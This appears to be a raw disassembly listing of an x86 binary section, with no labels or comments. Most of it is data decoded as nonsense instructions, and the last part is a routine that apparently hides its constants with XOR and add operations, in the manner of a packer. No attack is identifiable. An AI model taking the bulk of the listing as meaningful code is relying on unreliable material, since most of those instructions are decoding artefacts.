  4058e8:	in     eax,dx
  4058e9:	mov    esi,0x4ef35e46
  4058ee:	or     al,0x96
  4058f0:	dec    eax
  4058f1:	out    0xe,al
  4058f3:	push   cs
  4058f4:	jle    0x40596d
  4058f6:	and    ebx,esp
  4058f8:	xchg   edx,eax
  4058f9:	mov    dh,0x78
  4058fb:	jmp    0x14acf24f
  405900:	ror    BYTE PTR [ecx],0x57
  405903:	adc    ecx,DWORD PTR [ebx+0x1a]
  405906:	aad    0x2a
  405908:	or     DWORD PTR [esi],0x1a878c59
  40590e:	jae    0x40597e
  405910:	xor    edi,DWORD PTR [esi]
  405912:	jnp    0x405979
  405914:	xchg   ebp,eax
  405915:	sub    BYTE PTR [edi+0x2d],0xd0
  405919:	(bad)  [ecx+0x68e49d2a]
  40591f:	dec    edi
  405920:	cmp    al,0xb7
  405922:	loopne 0x40597d
  405924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405925:	mov    ebx,0xe9d2d96c
  40592a:	fwait
  40592b:	call   0x431909f5
  405930:	scas   al,BYTE PTR es:[edi]
  405931:	mov    DWORD PTR [eax-0x5d],ebx
  405934:	cmp    ebp,DWORD PTR [ebx+eiz*2-0x43]
  405938:	and    DWORD PTR [esi+edi*4+0x2],0xffffffa5
  40593d:	add    DWORD PTR [ebx+eax*1-0x5d1dac2d],edi
  405944:	sub    cl,0x40
  405947:	sbb    al,0xfd
  405949:	outs   dx,BYTE PTR ds:[esi]
  40594a:	jbe    0x405990
  40594c:	fisttp QWORD PTR [ebx-0x20c6d25b]
  405952:	adc    esi,DWORD PTR [edi+0x35]
  405955:	sets   BYTE PTR [eax-0x11]
  405959:	ror    BYTE PTR [ebx],cl
  40595b:	int    0x61
  40595d:	sbb    dh,BYTE PTR [esp+eiz*4]
  405960:	add    dl,cl
  405962:	je     0x4059cf
  405964:	inc    esi
  405965:	pop    esp
  405966:	jmp    0xd007:0x158cedf5
  40596d:	xchg   ebx,eax
  40596e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40596f:	cmp    DWORD PTR [ebp-0x39],esi
  405972:	int    0xb3
  405974:	cli    
  405975:	xor    eax,0x236c1f12
  40597a:	adc    eax,0x28de6f98
  40597f:	and    eax,0xddc274df
  405984:	inc    esi
  405985:	pop    edi
  405986:	scas   al,BYTE PTR es:[edi]
  405987:	xchg   ebx,eax
  405988:	jmp    0x148f:0x2b510074
  40598f:	fidivr WORD PTR [ebx+0x5871ba58]
  405995:	mov    eax,ds:0xfcdfe811
  40599a:	paddd  mm5,QWORD PTR [esi-0x4b68f9e6]
  4059a1:	mov    dh,0x2a
  4059a3:	into   
  4059a4:	inc    edx
  4059a5:	fnstcw WORD PTR [ebx+0x72eee852]
  4059ab:	aam    0xf7
  4059ad:	retf   0xf948
  4059b0:	icebp  
  4059b1:	scas   eax,DWORD PTR es:[edi]
  4059b2:	shl    bh,1
  4059b4:	sbb    dh,al
  4059b6:	test   BYTE PTR [ecx+0x4c],dl
  4059b9:	or     dh,BYTE PTR [edi+0x3f85eefd]
  4059bf:	jmp    0x405a2a
  4059c1:	fistp  DWORD PTR [ecx]
  4059c3:	add    dl,BYTE PTR [edx+0x6c]
  4059c6:	xor    eax,0xcc58b8ec
  4059cb:	or     DWORD PTR [edx*8+0x2065baf8],0xffffffd4
  4059d3:	or     al,0x25
  4059d5:	sub    BYTE PTR [ebp-0x41],bh
  4059d8:	aad    0xdd
  4059da:	es add al,0xf4
  4059dd:	clc    
  4059de:	and    ecx,ebx
  4059e0:	push   cs
  4059e1:	or     eax,0x59bbb0ec
  4059e6:	add    BYTE PTR [edx-0x32],bl
  4059e9:	in     al,0xa5
  4059eb:	fwait
  4059ec:	cmp    bl,cl
  4059ee:	adc    al,0x23
  4059f0:	repz inc ebx
  4059f2:	shl    bl,1
  4059f4:	test   al,0x7
  4059f6:	rep ins DWORD PTR es:[edi],dx
  4059f8:	and    dl,dl
  4059fa:	pop    edx
  4059fc:	xor    BYTE PTR [edi],0x5d
  4059ff:	scas   eax,DWORD PTR es:[edi]
  405a00:	jo     0x4059dc
  405a02:	push   edx
  405a03:	les    ebp,FWORD PTR [ebx+0x17419838]
  405a09:	sbb    dl,BYTE PTR [esi]
  405a0b:	test   BYTE PTR [esi-0x22a3ada],bh
  405a11:	shr    BYTE PTR [esi-0x64],0x30
  405a15:	(bad)  
  405a17:	xor    eax,0x54f94f7d
  405a1c:	cmp    ecx,DWORD PTR [ecx+0x5c]
  405a1f:	aas    
  405a20:	inc    esi
  405a21:	jnp    0x405a29
  405a23:	xchg   esi,eax
  405a24:	mov    ebx,0x7f0602b5
  405a29:	fld    TBYTE PTR [eax]
  405a2b:	and    BYTE PTR [edx],cl
  405a2d:	mov    eax,ds:0xc600f293
  405a32:	xchg   esp,eax
  405a33:	aam    0xb1
  405a35:	jne    0x405a3d
  405a37:	fcomp  QWORD PTR [esi]
  405a39:	mov    dl,BYTE PTR [ebx-0x20]
  405a3c:	aas    
  405a3d:	(bad)  
  405a3e:	popf   
  405a3f:	adc    al,BYTE PTR [esi]
  405a41:	and    DWORD PTR [edi-0x2de82776],0x45bc907e
  405a4b:	lds    eax,FWORD PTR [ecx-0x6e48810a]
  405a51:	push   es
  405a52:	test   al,0xfb
  405a54:	fmulp  st(5),st
  405a56:	je     0x405ad1
  405a58:	push   esp
  405a59:	int3   
  405a5a:	add    DWORD PTR [esi-0x5e3a8782],esi
  405a60:	adc    dh,BYTE PTR [ebp+edx*1+0x2b]
  405a64:	cdq    
  405a65:	jb     0x405a79
  405a67:	popf   
  405a68:	dec    ebx
  405a69:	mov    al,ds:0x90c97d9a
  405a6e:	xchg   ecx,eax
  405a6f:	mov    dh,0xca
  405a71:	jne    0x405ad1
  405a73:	popa   
  405a74:	fistp  DWORD PTR [esi-0x9]
  405a77:	int3   
  405a78:	hlt    
  405a79:	mov    ds:0x15882cca,al
  405a7e:	fild   DWORD PTR es:[eax-0xeb52a97]
  405a85:	cmp    ch,BYTE PTR [ecx]
  405a87:	leave  
  405a88:	xchg   edi,eax
  405a89:	or     DWORD PTR [edx+0x22],eax
  405a8c:	jno    0x405b05
  405a8e:	push   esi
  405a8f:	xor    cl,BYTE PTR [eax-0x67]
  405a92:	jno    0x405aab
  405a94:	mov    ebp,0x69459600
  405a99:	jmp    DWORD PTR [ebp-0x36be91c3]
  405a9f:	fmulp  st(2),st
  405aa1:	dec    ecx
  405aa2:	pop    ebx
  405aa3:	mov    eax,0x72d61f4e
  405aa8:	cli    
  405aa9:	in     eax,0x3c
  405aab:	or     eax,edx
  405aad:	(bad)  
  405aae:	in     eax,0x29
  405ab0:	jg     0x405a49
  405ab2:	loopne 0x405aeb
  405ab4:	ror    BYTE PTR [esi+eax*4],cl
  405ab7:	pop    ss
  405ab8:	mov    ds:0xa7962b09,eax
  405abd:	faddp  st(0),st
  405abf:	rcr    DWORD PTR [ebx-0x334f7209],0x2e
  405ac6:	add    DWORD PTR [esi-0x3d],edi
  405ac9:	push   ebp
  405aca:	push   ss
  405acb:	inc    eax
  405acc:	xor    ah,BYTE PTR [eax]
  405ace:	cmp    cl,BYTE PTR [eax+0x7199a811]
  405ad4:	jmp    0x405b1e
  405ad6:	sub    DWORD PTR [ebx+0x706644f4],ebx
  405adc:	push   esi
  405add:	lea    esp,[ebp+eax*2-0x12b84070]
  405ae4:	lds    esp,FWORD PTR [ebx]
  405ae6:	cld    
  405ae7:	rcr    DWORD PTR [edi],1
  405ae9:	jb     0x405aa3
  405aeb:	fsub   st,st(3)
  405aed:	mov    al,ds:0xc51e6952
  405af2:	stos   DWORD PTR es:[edi],eax
  405af3:	jne    0x405b2b
  405af5:	fldcw  WORD PTR [eax+0x40]
  405af8:	and    edx,DWORD PTR [edx-0xbb13ba3]
  405afe:	xchg   edx,eax
  405aff:	mov    bl,0x3c
  405b01:	test   eax,0xff078a46
  405b06:	cmp    al,0xd4
  405b08:	push   es
  405b09:	cmp    al,0xec
  405b0b:	xchg   edx,eax
  405b0c:	jne    0x405ac3
  405b0e:	out    0x37,eax
  405b10:	and    ebx,DWORD PTR [eax-0x9641af8]
  405b16:	in     al,dx
  405b17:	lds    edx,FWORD PTR [edi-0x6a]
  405b1a:	xor    eax,0x1dcbb2ce
  405b1f:	retf   0x1bab
  405b22:	xchg   edi,eax
  405b23:	xchg   esi,eax
  405b24:	mov    ch,0x95
  405b26:	push   ebx
  405b27:	mov    esi,edi
  405b29:	nop
  405b2a:	sar    DWORD PTR [edi],1
  405b2c:	xor    eax,0xd124fbd0
  405b32:	jmp    0x405b95
  405b34:	add    DWORD PTR [ebx-0x4c2959e3],edi
  405b3a:	loop   0x405ad4
  405b3c:	pop    cx
  405b3e:	shr    BYTE PTR [edi],1
  405b40:	std    
  405b41:	mov    bl,0x7
  405b43:	mov    ch,0x58
  405b45:	std    
  405b46:	inc    esp
  405b47:	retf   
  405b48:	clc    
  405b49:	mov    al,0x18
  405b4b:	enter  0x235e,0xa9
  405b4f:	mov    dh,BYTE PTR [ebp-0x35]
  405b52:	mov    ah,0x17
  405b54:	jge    0x405b0b
  405b56:	jo     0x405bd1
  405b58:	sbb    al,0xd6
  405b5a:	adc    BYTE PTR [ecx*2+0x3a706254],dl
  405b61:	cld    
  405b62:	xchg   BYTE PTR [ecx+0x63ebd8ae],ah
  405b68:	scas   eax,DWORD PTR es:[edi]
  405b69:	loopne 0x405b83
  405b6b:	data16 je 0x405b18
  405b6e:	push   0xffffffd0
  405b70:	or     dl,BYTE PTR [ebx-0x6]
  405b73:	pushf  
  405b74:	out    dx,al
  405b75:	and    eax,0x6c65bc46
  405b7a:	mov    WORD PTR [ecx+0x28],ss
  405b7d:	adc    bh,BYTE PTR [eax]
  405b7f:	in     eax,dx
  405b80:	mov    dh,ch
  405b82:	jae    0x405bdc
  405b84:	or     bl,BYTE PTR [edx]
  405b86:	xchg   ebx,eax
  405b87:	bound  edx,QWORD PTR [esi]
  405b89:	push   0x20
  405b8b:	(bad)  
  405b8c:	aam    0xe8
  405b8e:	(bad)  
  405b8f:	scas   al,BYTE PTR es:[edi]
  405b90:	and    eax,0x7c492eaa
  405b95:	cmp    eax,0x532edd6f
  405b9a:	xlat   BYTE PTR ds:[ebx]
  405b9b:	sti    
  405b9c:	jge    0x405b95
  405b9e:	nop
  405b9f:	retf   
  405ba0:	out    dx,al
  405ba1:	dec    edi
  405ba2:	inc    esi
  405ba3:	fadd   st,st(5)
  405ba5:	mov    edx,0x86fce845
  405baa:	stos   BYTE PTR es:[edi],al
  405bab:	xchg   ecx,eax
  405bac:	aad    0xf7
  405bae:	pop    ebx
  405baf:	sbb    esi,DWORD PTR [ebx+ecx*4+0x5b]
  405bb3:	fwait
  405bb4:	xchg   edx,eax
  405bb5:	push   cs
  405bb6:	sbb    dl,BYTE PTR [ecx+0x6c]
  405bb9:	(bad)  
  405bba:	loope  0x405be6
  405bbc:	mov    BYTE PTR [ebx-0x24],0x6b
  405bc0:	adc    al,0x4
  405bc2:	int    0x16
  405bc4:	(bad)  
  405bc5:	je     0x405b4f
  405bc7:	and    bl,BYTE PTR [edx]
  405bc9:	xchg   ebp,eax
  405bca:	jge    0x405c13
  405bcc:	add    al,0x1c
  405bce:	shr    DWORD PTR [ebx],cl
  405bd0:	cs jmp 0x920e8aa5
  405bd6:	xor    DWORD PTR [esi+esi*8],eax
  405bd9:	inc    edx
  405bda:	pop    ebx
  405bdb:	mov    edi,0x4baea97
  405be0:	call   0x9717:0x56673357
  405be7:	dec    esi
  405be8:	add    esp,DWORD PTR [edx]
  405bea:	retf   0x6e10
  405bed:	and    BYTE PTR [edi-0x23],dl
  405bf0:	cmc    
  405bf1:	and    edi,esp
  405bf3:	bound  ecx,QWORD PTR [esp+esi*8+0x688db0ed]
  405bfa:	jmp    0x405c40
  405bfc:	in     al,0x21
  405bfe:	jmp    0x493d1003
  405c03:	stos   BYTE PTR es:[edi],al
  405c04:	mov    al,BYTE PTR [ebx+0x667dee97]
  405c0a:	lock jns 0x405c20
  405c0d:	xor    eax,0x257a4f30
  405c12:	(bad)
  405c15:	dec    esi
  405c16:	sbb    al,0xbf
  405c18:	retf   
  405c19:	mov    eax,ds:0x9c08177a
  405c1e:	(bad)  
  405c1f:	xchg   esp,eax
  405c20:	mov    esi,ecx
  405c22:	gs into 
  405c24:	fsubrp st(7),st
  405c26:	jmp    0x405bcc
  405c28:	and    al,0x67
  405c2a:	out    dx,al
  405c2b:	sbb    DWORD PTR [eax],eax
  405c2d:	push   esp
  405c2e:	iret   
  405c2f:	rol    BYTE PTR [edx+0xdabb1dd],1
  405c35:	adc    al,0x60
  405c37:	sub    al,0xef
  405c39:	inc    esi
  405c3a:	pop    esp
  405c3b:	dec    edi
  405c3c:	mov    bh,0xc9
  405c3e:	pop    ecx
  405c3f:	mov    ecx,0xfd37a725
  405c44:	daa    
  405c45:	(bad)  [ecx-0x4db750ac]
  405c4b:	test   BYTE PTR [ecx+0x67],dh
  405c4e:	popa   
  405c4f:	pop    edx
  405c50:	nop
  405c51:	cmp    al,0x48
  405c53:	jnp    0x405c27
  405c55:	push   ss
  405c56:	in     eax,0xbb
  405c58:	push   eax
  405c59:	retf   
  405c5a:	test   BYTE PTR ds:0x4b160168,0x74
  405c61:	rcl    BYTE PTR [edx-0x4e],cl
  405c64:	xor    eax,0x3d4cd492
  405c69:	cmp    DWORD PTR [ecx],edx
  405c6b:	and    BYTE PTR [esp+ecx*2-0x3],al
  405c6f:	shr    bl,cl
  405c71:	sar    DWORD PTR [eax],1
  405c73:	fcom   DWORD PTR [edi-0x41]
  405c76:	ror    BYTE PTR [ecx+ebx*8-0x453df5b7],cl
  405c7d:	jb     0x405c7a
  405c7f:	icebp  
  405c80:	and    BYTE PTR [esi+0x4a2f44c1],ch
  405c86:	(bad)  
  405c89:	or     eax,0x1fb85885
  405c8e:	mov    dh,0xd6
  405c90:	daa    
  405c91:	js     0x405c68
  405c93:	xchg   edx,eax
  405c94:	fs jmp 0x3dae:0x86763866
  405c9c:	js     0x405c47
  405c9e:	adc    eax,0xcdfe0c37
  405ca3:	inc    esi
  405ca4:	xor    BYTE PTR [esi+0xe],0x4d
  405ca8:	jne    0x405c81
  405caa:	cdq    
  405cab:	jmp    0xd6cc:0x9c2b2a6a
  405cb2:	fidivr DWORD PTR [ebp-0x6d519f31]
  405cb8:	test   eax,0x1c3996ac
  405cbd:	inc    ecx
  405cbe:	icebp  
  405cbf:	push   ecx
  405cc0:	pop    edx
  405cc1:	cli    
  405cc2:	mov    esi,edi
  405cc4:	sbb    ebp,DWORD PTR [edx+0x14]
  405cc7:	scas   al,BYTE PTR es:[edi]
  405cc8:	sub    ch,BYTE PTR [esi]
  405cca:	mov    ds,ecx
  405ccc:	dec    eax
  405ccd:	sbb    cl,dl
  405ccf:	pop    edx
  405cd0:	xchg   esi,eax
  405cd1:	stc    
  405cd2:	add    BYTE PTR [eax+eiz*4-0x6dad9bcf],al
  405cd9:	mov    esp,0x7dfb4e2e
  405cde:	or     al,0x14
  405ce0:	xor    al,0x9a
  405ce2:	inc    esp
  405ce3:	mov    esi,ecx
  405ce5:	pop    esi
  405ce6:	xchg   DWORD PTR [edi+0x7d],esp
  405ce9:	add    DWORD PTR [ecx+0x11],ecx
  405cec:	out    0x60,al
  405cee:	ret    0x7d45
  405cf1:	out    dx,eax
  405cf2:	dec    esp
  405cf3:	xchg   edx,eax
  405cf4:	sahf   
  405cf5:	xchg   ecx,eax
  405cf6:	jno    0x405ce3
  405cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf9:	idiv   BYTE PTR [eax]
  405cfb:	ins    DWORD PTR es:[edi],dx
  405cfc:	(bad)  
  405cfd:	push   edi
  405cfe:	dec    esi
  405cff:	sub    esp,eax
  405d01:	retf   
  405d02:	cs ret 0xac00
  405d06:	pop    es
  405d07:	imul   edi,DWORD PTR [ecx+esi*4-0x6af5fa5],0xffffffb2
  405d0f:	mov    bh,0xee
  405d11:	xchg   ebp,eax
  405d12:	popf   
  405d13:	mov    BYTE PTR [edx],bl
  405d15:	cld    
  405d16:	jg     0x405d3d
  405d18:	mov    ch,0xbd
  405d1a:	ss stos BYTE PTR es:[edi],al
  405d1c:	mov    ah,BYTE PTR [ebx]
  405d1e:	push   ds
  405d1f:	loop   0x405d87
  405d21:	(bad)  
  405d22:	in     eax,dx
  405d23:	cdq    
  405d24:	or     BYTE PTR [ebp+0x1ce04049],bh
  405d2a:	push   eax
  405d2b:	or     bh,dh
  405d2d:	mov    eax,ds:0x70a3e493
  405d32:	mov    ds:0xd505ebb7,al
  405d37:	fnsave [edx-0x64]
  405d3a:	fwait
  405d3b:	repz out dx,eax
  405d3d:	(bad)  
  405d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d3f:	aaa    
  405d40:	leave  
  405d41:	imul   eax,DWORD PTR [ecx+ebp*8-0x5d],0x73
  405d46:	add    DWORD PTR [esi+edi*2-0xde9bbdf],ebx
  405d4d:	and    al,0x1e
  405d4f:	sub    cl,bl
  405d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d52:	lods   al,BYTE PTR ds:[esi]
  405d53:	push   0xffffff86
  405d55:	add    DWORD PTR [edx+0x49f83cdc],edx
  405d5b:	ins    DWORD PTR es:[edi],dx
  405d5c:	mov    bh,0x11
  405d5e:	aaa    
  405d5f:	js     0x405d43
  405d61:	ja     0x405d55
  405d63:	cs frstpm(287 only) 
  405d66:	push   edi
  405d67:	not    BYTE PTR [edx]
  405d69:	jo     0x405d8a
  405d6b:	retf   
  405d6c:	add    DWORD PTR [edx],esi
  405d6e:	pusha  
  405d6f:	jle    0x405dd4
  405d71:	ror    BYTE PTR [ecx],1
  405d73:	mov    ebp,DWORD PTR ds:0x3bc8b408
  405d79:	pushf  
  405d7a:	mov    esp,fs
  405d7c:	sbb    DWORD PTR ds:[ebx+0x1e],esi
  405d80:	cli    
  405d81:	(bad)  
  405d82:	stc    
  405d83:	repz lea ebp,[esi+0x1efc5bed]
  405d8a:	iret   
  405d8b:	test   DWORD PTR [ebx+0x4e],ebx
  405d8e:	cmp    dh,BYTE PTR [edi]
  405d90:	rcr    BYTE PTR [ebx-0x80],cl
  405d93:	dec    edx
  405d94:	icebp  
  405d95:	enter  0x79aa,0xbb
  405d99:	(bad)  
  405d9a:	addr16 loop 0x405e11
  405d9d:	push   ebx
  405d9e:	ds leave 
  405da0:	dec    cl
  405da2:	inc    ebp
  405da3:	inc    esi
  405da4:	cmp    eax,DWORD PTR [eax-0x22]
  405da7:	fst    DWORD PTR [ebp-0x1a]
  405daa:	fisttp DWORD PTR [eax-0x37]
  405dad:	or     al,bh
  405daf:	adc    al,0xc1
  405db1:	xor    BYTE PTR [ecx],ch
  405db3:	and    eax,0x2dba6002
  405db8:	test   DWORD PTR [ebx+0x49],ebp
  405dbb:	aam    0x3b
  405dbd:	jl     0x405df4
  405dbf:	dec    ecx
  405dc0:	jb     0x405da8
  405dc2:	push   ds
  405dc3:	inc    esp
  405dc4:	push   ds
  405dc5:	jg     0x405d6b
  405dc7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  405dc9:	shl    BYTE PTR [ecx*4-0x648b219b],0x6a
  405dd1:	and    bl,bh
  405dd3:	inc    esi
  405dd4:	pusha  
  405dd5:	pop    esp
  405dd6:	cmp    dh,BYTE PTR [ecx-0x7f]
  405dd9:	imul   ecx,DWORD PTR [edx+0x50bfb3d4],0x8f36a4fe
  405de3:	nop
  405de4:	je     0x405d7a
  405de6:	dec    eax
  405de7:	les    esp,FWORD PTR [esi+ebp*1-0x485c9435]
  405dee:	pushf  
  405def:	and    BYTE PTR [ebx+0x478628d6],0x7b
  405df6:	aas    
  405df7:	push   ecx
  405df8:	xor    al,0xf1
  405dfa:	push   esi
  405dfb:	ins    BYTE PTR es:[edi],dx
  405dfc:	push   ecx
  405dfd:	shl    BYTE PTR [ebx],0x26
  405e00:	mov    ebp,0x30b80beb
  405e05:	loope  0x405e1b
  405e07:	ins    BYTE PTR es:[edi],dx
  405e08:	cdq    
  405e09:	mov    ah,0x6e
  405e0b:	jbe    0x405e03
  405e0d:	sub    esi,DWORD PTR [edx]
  405e0f:	imul   eax,DWORD PTR [eax-0x493884d2],0x8bd6b251
  405e19:	dec    ebx
  405e1a:	inc    ebp
  405e1b:	fsub   QWORD PTR [ebp-0x500b606d]
  405e21:	mov    bl,0x7c
  405e23:	xor    BYTE PTR [edx+edx*4-0x1d],0xa6
  405e28:	push   ecx
  405e29:	xchg   BYTE PTR [edx],ch
  405e2b:	fnstcw WORD PTR [ebx+0x7d2fa4ee]
  405e31:	call   0x144e:0xc162af31
  405e38:	es cmp eax,0x7cc81d72
  405e3e:	add    DWORD PTR [eax-0x16],0xd677bc6b
  405e45:	adc    bh,BYTE PTR [esi+0x15]
  405e48:	dec    ebp
  405e49:	xor    cl,BYTE PTR ds:0xa8d7b444
  405e4f:	ret    0xb0d
  405e52:	or     al,0x8
  405e54:	pop    edx
  405e55:	pop    ebp
  405e56:	shr    cl,cl
  405e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e59:	call   0x9ae2d9f3
  405e5e:	imul   esi,DWORD PTR [edi-0x564d5b7b],0xf5340261
  405e68:	mov    ds:0x2e94d986,eax
  405e6d:	imul   esi,DWORD PTR [ebx+eiz*8],0xfffffff5
  405e71:	mov    ebp,0x847d5fc0
  405e76:	test   al,0x12
  405e78:	pop    ebx
  405e79:	bound  eax,QWORD PTR [eax-0x53]
  405e7c:	and    BYTE PTR gs:[esi-0x5],dh
  405e80:	pop    esi
  405e81:	lea    ebp,[edi]
  405e83:	push   esp
  405e84:	cs push edi
  405e86:	sbb    al,0x11
  405e88:	fwait
  405e89:	pushf  
  405e8a:	xor    bl,BYTE PTR [edx-0x7fedceb2]
  405e90:	cwde   
  405e91:	add    eax,0x95592acf
  405e96:	cs dec ebx
  405e98:	mov    bl,BYTE PTR [esi+eax*1]
  405e9b:	arpl   WORD PTR [edx],cx
  405e9d:	inc    esp
  405e9e:	add    ebp,eax
  405ea0:	repz dec ebx
  405ea2:	int    0x7c
  405ea4:	fld    QWORD PTR [ebx]
  405ea6:	sub    eax,DWORD PTR [edi]
  405ea8:	into   
  405ea9:	mov    BYTE PTR [ebp-0x69],cl
  405eac:	mov    edi,0xa9289610
  405eb1:	mov    ebp,0x394326fd
  405eb6:	in     eax,0x94
  405eb8:	je     0x405e91
  405eba:	jl     0x405f20
  405ebc:	inc    esp
  405ebd:	jnp    0x405f0a
  405ebf:	daa    
  405ec0:	dec    edx
  405ec1:	aam    0x39
  405ec3:	xchg   cl,cl
  405ec5:	xor    al,0xa7
  405ec7:	rcr    BYTE PTR [esi+ebx*8+0x1440fc46],0xc5
  405ecf:	dec    esp
  405ed0:	pop    esp
  405ed1:	and    ecx,DWORD PTR [edx+0x1559aa22]
  405ed7:	push   0xfbe7aa69
  405edc:	jl     0x405f07
  405ede:	pushf  
  405edf:	pop    ss
  405ee0:	xchg   edx,eax
  405ee1:	push   esp
  405ee2:	mov    ecx,ss
  405ee4:	inc    eax
  405ee5:	mov    dl,0xa9
  405ee7:	mov    eax,ds:0xac084c7f
  405eec:	dec    esi
  405eed:	adc    ecx,esp
  405eef:	(bad)  
  405ef0:	ja     0x405ef6
  405ef2:	sbb    esp,DWORD PTR [ecx-0x4e]
  405ef5:	lahf   
  405ef6:	jbe    0x405f0b
  405ef8:	jb     0x405e9f
  405efa:	add    BYTE PTR [edx],0xb4
  405efd:	xchg   esp,eax
  405efe:	push   edx
  405eff:	mov    dl,0xf4
  405f01:	jnp    0x405f11
  405f03:	push   ss
  405f04:	jns    0x405f34
  405f06:	push   eax
  405f07:	retf   
  405f08:	inc    edi
  405f09:	sub    al,0xa6
  405f0b:	pop    ebp
  405f0c:	(bad)  [edx+0x5758b5e8]
  405f12:	in     al,0x87
  405f14:	xor    DWORD PTR [esi-0xc],ebx
  405f17:	adc    DWORD PTR [ebp+0x6f],esi
  405f1a:	mov    DWORD PTR [edi],esi
  405f1c:	adc    eax,0x5d2a4e09
  405f21:	scas   eax,DWORD PTR es:[edi]
  405f22:	adc    ebp,esp
  405f24:	mov    DWORD PTR [ebp-0x5f],esi
  405f27:	jl     0x405f7f
  405f29:	xchg   DWORD PTR gs:[di-0x4c],ecx
  405f2e:	in     eax,0xeb
  405f30:	sub    DWORD PTR [ecx-0x1a],ebp
  405f33:	mov    ds:0x42e9003e,al
  405f38:	or     dl,BYTE PTR [edi-0x7f]
  405f3b:	rcr    DWORD PTR [ebp+0x43],cl
  405f3e:	inc    ebp
  405f3f:	jp     0x405f5a
  405f41:	mov    edx,0xd6903bf8
  405f46:	out    dx,al
  405f47:	mov    DWORD PTR [ebp-0x2c],eax
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
